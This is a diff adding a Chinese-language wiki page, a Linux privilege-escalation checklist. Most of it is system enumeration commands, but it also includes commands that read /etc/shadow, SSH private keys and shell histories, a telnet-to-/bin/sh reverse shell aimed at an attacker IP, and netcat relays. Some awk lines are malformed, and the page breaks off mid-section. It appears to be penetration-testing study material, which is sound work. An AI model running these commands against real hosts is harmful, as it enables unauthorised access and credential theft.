@@ -1,0 +1,470 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
+        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
+        <title>linux提权 - Wiki | janes</title>
+        <meta name="keywords" content=""/>
+        <meta name="description" content=""/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    </head>
+
+    <body>
+        <div id="container">
+            
+<div id="header">
+  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;linux提权</div>
+</div>
+<div class="clearfix"></div>
+<div id="title">linux提权</div>
+  <div id="content">
+  <h2 id="_1">系统类型</h2>
+<h3 id="_2">系统版本?</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/*-</span><span class="n">release</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">lsb</span><span class="o">-</span><span class="n">release</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">redhat</span><span class="o">-</span><span class="n">release</span>
+</pre></div>
+
+
+<h3 id="_3">内核版本</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">version</span>  
+<span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
+<span class="n">uname</span> <span class="o">-</span><span class="n">mrs</span>
+<span class="n">rpm</span> <span class="o">-</span><span class="n">q</span> <span class="n">kernel</span>
+<span class="n">dmesg</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">Linux</span>
+<span class="n">ls</span> <span class="o">/</span><span class="n">boot</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">vmlinuz</span>
+</pre></div>
+
+
+<h3 id="_4">环境变量</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bashrc</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bash_profile</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bashrc</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bash_logout</span>
+<span class="n">env</span>
+<span class="n">set</span>
+</pre></div>
+
+
+<h3 id="_5">是否有台打印机？</h3>
+<div class="hlcode"><pre><span class="n">lpstat</span> <span class="o">-</span><span class="n">a</span>
+</pre></div>
+
+
+<h2 id="_6">应用与服务</h2>
+<h3 id="_7">运行服务， 服务用户权限</h3>
+<div class="hlcode"><pre><span class="n">ps</span> <span class="n">aux</span>
+<span class="n">ps</span> <span class="o">-</span><span class="n">ef</span>
+<span class="n">top</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">service</span>
+</pre></div>
+
+
+<h3 id="root">服务具有root的权限， 这些服务里你看起来那些有漏洞,进行再次检查</h3>
+<div class="hlcode"><pre><span class="n">ps</span> <span class="n">aux</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">root</span>
+<span class="n">ps</span> <span class="o">-</span><span class="n">ef</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">root</span>
+</pre></div>
+
+
+<h3 id="_8">安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？</h3>
+<div class="hlcode"><pre><span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">sbin</span><span class="o">/</span>
+<span class="n">dpkg</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">rpm</span> <span class="o">-</span><span class="n">qa</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">apt</span><span class="o">/</span><span class="n">archivesO</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">yum</span><span class="o">/</span>
+</pre></div>
+
+
+<h3 id="service">Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">syslog</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">chttp</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">lighttpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cups</span><span class="o">/</span><span class="n">cupsd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">inetd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">apache2</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">my</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">lampp</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">aRl</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">‘$</span><span class="mi">1</span> <span class="o">~</span> <span class="o">/^</span><span class="p">.</span><span class="o">*</span><span class="n">r</span><span class="p">.</span><span class="err">*/</span>
+</pre></div>
+
+
+<h3 id="_9">主机上有哪些工作计划？</h3>
+<div class="hlcode"><pre><span class="n">crontab</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">cron</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">*</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">*</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">at</span><span class="p">.</span><span class="n">allow</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">at</span><span class="p">.</span><span class="n">deny</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">allow</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">deny</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">anacrontab</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/</span><span class="n">crontabs</span><span class="o">/</span><span class="n">root</span>
+</pre></div>
+
+
+<h3 id="_10">主机上可能有哪些纯文本用户名和密码?</h3>
+<div class="hlcode"><pre><span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="n">user</span> <span class="p">[</span><span class="n">filename</span><span class="p">]</span>
+<span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="n">pass</span> <span class="p">[</span><span class="n">filename</span><span class="p">]</span>
+<span class="n">grep</span> <span class="o">-</span><span class="n">C</span> <span class="mi">5</span> <span class="s">&quot;password&quot;</span> <span class="p">[</span><span class="n">filename</span><span class="p">]</span>
+<span class="n">find</span> <span class="p">.</span> <span class="o">-</span><span class="n">name</span> <span class="s">&quot;*.php&quot;</span> <span class="o">-</span><span class="n">print0</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">-</span><span class="mi">0</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">n</span> <span class="s">&quot;var $password&quot;</span>   <span class="err">#</span> <span class="n">Joomla</span>
+</pre></div>
+
+
+<h2 id="_11">通信与网络</h2>
+<h3 id="nics">NIC(s)，系统有哪些？它是连接到哪一个网络？</h3>
+<div class="hlcode"><pre><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">ifconfig</span> <span class="o">-</span><span class="n">a</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">network</span><span class="o">/</span><span class="n">interfaces</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysconfig</span><span class="o">/</span><span class="n">network</span>
+</pre></div>
+
+
+<h3 id="dhcpdns">网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">resolv</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysconfig</span><span class="o">/</span><span class="n">network</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">networks</span>
+<span class="n">iptables</span> <span class="o">-</span><span class="n">L</span>
+<span class="n">hostname</span>
+<span class="n">dnsdomainname</span>
+</pre></div>
+
+
+<h3 id="_12">其他用户主机与系统的通信？</h3>
+<div class="hlcode"><pre><span class="n">lsof</span> <span class="o">-</span><span class="n">i</span>
+<span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="o">:</span><span class="mi">80</span>
+<span class="n">grep</span> <span class="mi">80</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">services</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">antup</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">antpx</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">tulpn</span>
+<span class="n">chkconfig</span> <span class="o">--</span><span class="n">list</span>
+<span class="n">chkconfig</span> <span class="o">--</span><span class="n">list</span> <span class="o">|</span> <span class="n">grep</span> <span class="mi">3</span><span class="o">:</span><span class="n">on</span>
+<span class="n">last</span>
+<span class="n">w</span>
+</pre></div>
+
+
+<h3 id="ipmac">缓存？IP和/或MAC地址?</h3>
+<div class="hlcode"><pre><span class="n">arp</span> <span class="o">-</span><span class="n">e</span>
+<span class="n">route</span>
+<span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">route</span> <span class="o">-</span><span class="n">nee</span>
+</pre></div>
+
+
+<p>数据包可能嗅探吗？可以看出什么？监听流量</p>
+<div class="hlcode"><pre><span class="cp"># tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</span>
+<span class="n">tcpdump</span> <span class="n">tcp</span> <span class="n">dst</span> <span class="mf">192.168.1.7</span> <span class="mi">80</span> <span class="n">and</span> <span class="n">tcp</span> <span class="n">dst</span> <span class="mf">10.2.2.222</span> <span class="mi">21</span>
+</pre></div>
+
+
+<h3 id="getshell">你如何get一个shell？你如何与系统进行交互？</h3>
+<div class="hlcode"><pre><span class="cp"># http:</span><span class="c1">//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span>    <span class="err">#</span> <span class="n">Attacker</span><span class="p">.</span> <span class="err">输入</span> <span class="p">(</span><span class="err">命令</span><span class="p">)</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4445</span>    <span class="err">#</span> <span class="n">Attacker</span><span class="p">.</span> <span class="err">输出</span><span class="p">(</span><span class="err">结果</span><span class="p">)</span>
+<span class="n">telnet</span> <span class="p">[</span><span class="n">atackers</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44444</span> <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">|</span> <span class="p">[</span><span class="n">local</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44445</span>    <span class="err">#</span> <span class="err">在目标系统上</span><span class="p">.</span> <span class="err">使用</span> <span class="err">攻击者的</span><span class="n">IP</span><span class="o">!</span>
+</pre></div>
+
+
+<h3 id="_13">如何端口转发？（端口重定向）</h3>
+<div class="hlcode"><pre><span class="cp"># rinetd</span>
+
+<span class="cp"># http:</span><span class="c1">//www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</span>
+<span class="cp"># fpipe</span>
+
+<span class="cp"># FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]</span>
+<span class="n">FPipe</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">l</span> <span class="mi">80</span> <span class="o">-</span><span class="n">r</span> <span class="mi">80</span> <span class="o">-</span><span class="n">s</span> <span class="mi">80</span> <span class="mf">192.168.1.7</span>
+<span class="cp">#ssh</span>
+
+<span class="cp"># ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</span>
+<span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8080</span><span class="o">:</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">80</span> <span class="n">root</span><span class="mf">@192.168.1.7</span>    <span class="err">#</span> <span class="n">Local</span> <span class="n">Port</span>
+<span class="n">ssh</span> <span class="o">-</span><span class="n">R</span> <span class="mi">8080</span><span class="o">:</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">80</span> <span class="n">root</span><span class="mf">@192.168.1.7</span>    <span class="err">#</span> <span class="n">Remote</span> <span class="n">Port</span>
+<span class="cp">#mknod</span>
+
+<span class="cp"># mknod backpipe p ; nc -l -p [remote port] &lt; backpipe  | nc [local IP] [local port] &gt;backpipe</span>
+<span class="n">mknod</span> <span class="n">backpipe</span> <span class="n">p</span> <span class="p">;</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span> <span class="o">&lt;</span> <span class="n">backpipe</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">10.1.1.251</span> <span class="mi">80</span> <span class="o">&gt;</span><span class="n">backpipe</span>    <span class="err">#</span> <span class="n">Port</span> <span class="n">Relay</span>
+<span class="n">mknod</span> <span class="n">backpipe</span> <span class="n">p</span> <span class="p">;</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span> <span class="mi">0</span> <span class="o">&amp;</span> <span class="o">&lt;</span> <span class="n">backpipe</span> <span class="o">|</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="n">inflow</span> <span class="o">|</span> <span class="n">nc</span> <span class="n">localhost</span> <span class="mi">80</span> <span class="o">|</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="n">outflow</span> <span class="mi">1</span><span class="o">&gt;</span><span class="n">backpipe</span>    <span class="err">#</span> <span class="n">Proxy</span> <span class="p">(</span><span class="n">Port</span> <span class="mi">80</span> <span class="n">to</span> <span class="mi">8080</span><span class="p">)</span>
+<span class="n">mknod</span>
+
+<span class="n">backpipe</span> <span class="n">p</span> <span class="p">;</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span> <span class="mi">0</span> <span class="o">&amp;</span> <span class="o">&lt;</span> <span class="n">backpipe</span> <span class="o">|</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="n">inflow</span> <span class="o">|</span> <span class="n">nc</span>
+<span class="n">localhost</span> <span class="mi">80</span> <span class="o">|</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="n">outflow</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="o">&gt;</span><span class="n">backpipe</span>    <span class="err">#</span> <span class="n">Proxy</span> <span class="n">monitor</span> <span class="p">(</span><span class="n">Port</span> <span class="mi">80</span> <span class="n">to</span> <span class="mi">8080</span><span class="p">)</span>
+</pre></div>
+
+
+<h3 id="_14">建立隧道可能吗？本地，远程发送命令</h3>
+<div class="hlcode"><pre><span class="n">ssh</span> <span class="o">-</span><span class="n">D</span> <span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">9050</span> <span class="o">-</span><span class="n">N</span> <span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="err">@</span><span class="p">[</span><span class="n">ip</span><span class="p">]</span>
+<span class="n">proxychains</span> <span class="n">ifconfig</span>
+</pre></div>
+
+
+<h2 id="_15">秘密信息和用户</h2>
+<h3 id="id">你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？</h3>
+<div class="hlcode"><pre><span class="n">id</span>
+<span class="n">who</span>
+<span class="n">w</span>
+<span class="n">last</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span><span class="o">:</span>    <span class="err">#</span> <span class="n">List</span> <span class="n">of</span> <span class="n">users</span>
+<span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">E</span> <span class="s">&quot;^#&quot;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="n">F</span><span class="o">:</span> <span class="o">&amp;</span><span class="err">#</span><span class="mo">03</span><span class="mi">9</span><span class="p">;</span><span class="err">$</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span> <span class="n">print</span> <span class="err">$</span><span class="mi">1</span><span class="p">}</span><span class="err">&#39;</span>   <span class="err">#</span> <span class="n">List</span> <span class="n">of</span> <span class="n">super</span> <span class="n">users</span>
+<span class="n">awk</span> <span class="o">-</span><span class="n">F</span><span class="o">:</span> <span class="err">&#39;</span><span class="p">(</span><span class="err">$</span><span class="mi">3</span> <span class="o">==</span> <span class="s">&quot;0&quot;</span><span class="p">)</span> <span class="p">{</span><span class="n">print</span><span class="p">}</span><span class="o">&amp;</span><span class="err">#</span><span class="mo">03</span><span class="mi">9</span><span class="p">;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>   <span class="err">#</span> <span class="n">List</span> <span class="n">of</span> <span class="n">super</span> <span class="n">users</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span>
+<span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</pre></div>
+
+
+<h3 id="_16">可以找到什么敏感文件？</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">group</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span>
+</pre></div>
+
+
+<h3 id="homedirectories">什么有趣的文件在home/directorie（S）里？如果有权限访问</h3>
+<div class="hlcode"><pre><span class="n">ls</span> <span class="o">-</span><span class="n">ahlR</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">ahlR</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span>
+</pre></div>
+
+
+<h3 id="_17">是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">inc</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">user</span><span class="p">.</span><span class="n">MYD</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">anaconda</span><span class="o">-</span><span class="n">ks</span><span class="p">.</span><span class="n">cfg</span>
+</pre></div>
+
+
+<h3 id="_18">用户做过什么？是否有任何密码呢？他们有没有编辑什么？</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bash_history</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">nano_history</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">atftp_history</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">mysql_history</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">php_history</span>
+</pre></div>
+
+
+<h3 id="_19">可以找到什么样的用户信息</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bashrc</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">profile</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">root</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">root</span>
+<span class="n">private</span><span class="o">-</span><span class="n">key</span> 
+</pre></div>
+
+
+<h3 id="_20">信息能否被发现？</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">identity</span><span class="p">.</span><span class="n">pub</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">identity</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">pub</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_dsa</span><span class="p">.</span><span class="n">pub</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_dsa</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_config</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">sshd_config</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_host_dsa_key</span><span class="p">.</span><span class="n">pub</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_host_dsa_key</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_host_rsa_key</span><span class="p">.</span><span class="n">pub</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_host_rsa_key</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_host_key</span><span class="p">.</span><span class="n">pub</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_host_key</span>
+</pre></div>
+
+
+<h2 id="_21">文件系统</h2>
+<h3 id="etc">哪些用户可以写配置文件在/ etc /？能够重新配置服务？</h3>
+<div class="hlcode"><pre><span class="n">ls</span> <span class="o">-</span><span class="n">aRl</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">‘$</span><span class="mi">1</span> <span class="o">~</span> <span class="o">/^</span><span class="p">.</span><span class="o">*</span><span class="n">w</span><span class="p">.</span><span class="err">*/&#39;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="err">#</span> <span class="n">Anyone</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">aRl</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">’$</span><span class="mi">1</span> <span class="o">~</span> <span class="o">/^</span><span class="p">..</span><span class="n">w</span><span class="o">/</span><span class="err">&#39;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>        <span class="err">#</span> <span class="n">Owner</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">aRl</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">‘$</span><span class="mi">1</span> <span class="o">~</span> <span class="o">/^</span><span class="p">.....</span><span class="n">w</span><span class="o">/</span><span class="err">&#39;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">Group</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">aRl</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">’</span><span class="p">;</span><span class="err">$</span><span class="mi">1</span> <span class="o">~</span> <span class="o">/</span><span class="n">w</span><span class="p">.</span><span class="err">$</span><span class="o">/</span><span class="err">&#39;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>          <span class="err">#</span> <span class="n">Other</span>
+<span class="n">find</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">-</span><span class="n">readable</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>                         <span class="err">#</span> <span class="n">Anyone</span>
+<span class="n">find</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">-</span><span class="n">readable</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">maxdepth</span> <span class="mi">1</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="err">#</span> <span class="n">Anyone</span>
+</pre></div>
+
+
+<h3 id="var">在/ var /有什么可以发现？</h3>
+<div class="hlcode"><pre><span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">pgsql</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dhcp3</span><span class="o">/</span><span class="n">dhclient</span><span class="p">.</span><span class="n">leases</span>
+</pre></div>
+
+
+<h3 id="_22">网站上的任何隐藏配置/文件?配置文件与数据库信息？</h3>
+<div class="hlcode"><pre><span class="n">ls</span> <span class="o">-</span><span class="n">alhR</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alhR</span> <span class="o">/</span><span class="n">srv</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">htdocs</span><span class="o">/</span>
